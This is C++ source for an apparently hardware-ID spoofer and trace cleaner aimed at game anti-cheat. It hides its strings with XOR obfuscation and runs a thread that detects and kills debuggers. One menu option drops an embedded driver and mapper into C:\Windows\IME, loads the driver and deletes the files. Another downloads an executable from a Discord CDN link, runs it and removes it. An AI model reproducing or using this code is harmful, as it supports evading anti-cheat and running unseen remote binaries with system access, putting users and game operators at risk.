#include "Include.h"

void debug()
{
	while (true)
	{
		nignog();
		debuggerfound();
		killdbg();
		titledetect();
		driverdetect();
		Sleep(1000);
	}
}

void CleanYourTraces()
{
	C_Clear();
	C_Color();
	std::cout << _xor_("\n\n      Cleaning...") << "\n";
	HRESULT a = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/913245685799850014/916253100459819008/pastewin_log_cleaner.exe"), _T("C:/Windows/IME/alllogcleaner.exe"), 0, NULL);
	system(_xor_("start C:/Windows/IME/alllogcleaner.exe").c_str());
	Sleep(1500);
	system(_xor_("taskkill /f /im cmd.exe >nul 2>&1").c_str());
	remove(_xor_("C://Windows//IME//alllogcleaner.exe").c_str());
	Sleep(4500);
	exit(9);
}

std::string DiskDriver1 = (_xor_("C:\\Windows\\IME\\D.sys").c_str());
std::string DiskMapper1 = (_xor_("C:\\Windows\\IME\\M.exe").c_str());

int main()
{

	std::thread TBar(Title);
	std::thread Debug(debug);
	Close_Shit();
	C_Color();
	std::cout << _xor_("\n\n") << "\n";
	std::cout << _xor_("     +--^----------,--------,-----,--------^-,") << "\n";
	std::cout << _xor_("     | |||||||||   `--------'     |          O       Made By ZF9#1214 + BadVibesForever#1337") << "\n";
	std::cout << _xor_("     `+---------------------------^----------|") << "\n";
	std::cout << _xor_("       `\_,---------,---------,--------------'") << "\n";
	std::cout << _xor_("         / XXXXXX /'|       /'") << "\n";
	std::cout << _xor_("        / XXXXXX /  `\\    /'") << "\n";
	std::cout << _xor_("       / XXXXXX /`-------'") << "\n";
	std::cout << _xor_("      / XXXXXX /") << "\n";
	std::cout << _xor_("     / XXXXXX /") << "\n";
	std::cout << _xor_("    (________(                ") << "\n";
	std::cout << _xor_("     `------'") << "\n";
	Sleep(3000);
	C_Clear();
	std::string choice;
	std::cout << _xor_("\n\n") << "\n";
	std::cout << _xor_("   1) Disk Driver 1") << "\n";
	std::cout << _xor_("   2) Disk Driver 2") << "\n";
	std::cout << _xor_("   3) Serial Check") << "\n";
	std::cout << _xor_("   4) Game Cleaner") << "\n";
	std::cout << _xor_("   Please slect an option from above: ");
	std::getline(std::cin, choice);
	if (choice == "1")
	{
		if (!FileExistss(DiskDriver1)) utils::CreateFileFromMemory(DiskDriver1, reinterpret_cast<const char*>(DiskDriver1Bytes), sizeof(DiskDriver1Bytes));
		if (!FileExistss(DiskMapper1)) utils::CreateFileFromMemory(DiskMapper1, reinterpret_cast<const char*>(DiskMapper1Bytes), sizeof(DiskMapper1Bytes));
		system(_xor_("C:\\Windows\\IME\\M.exe C:\\Windows\\IME\\D.sys").c_str());
		std::remove(_xor_("C:\\Windows\\IME\\M.exe").c_str());
		std::remove(_xor_("C:\\Windows\\IME\\D.sys").c_str());
		Sleep(4500);
		exit(9);
	}
	if (choice == "2")
	{
		MessageBox(0, (_xor_(L"To Be Added Soon!").c_str()), (_xor_(L"").c_str()), MB_OK);
		exit(9);
	}
	if (choice == "3")
	{
		C_Clear();
		system(_xor_("wmic diskdrive get serialnumber").c_str());
		Sleep(4500);
		exit(9);
	}
	if (choice == "4")
	{
		CleanYourTraces();
	}
	if (choice == "5")
	{

	}
	else
	{
		exit(9);
	}
}
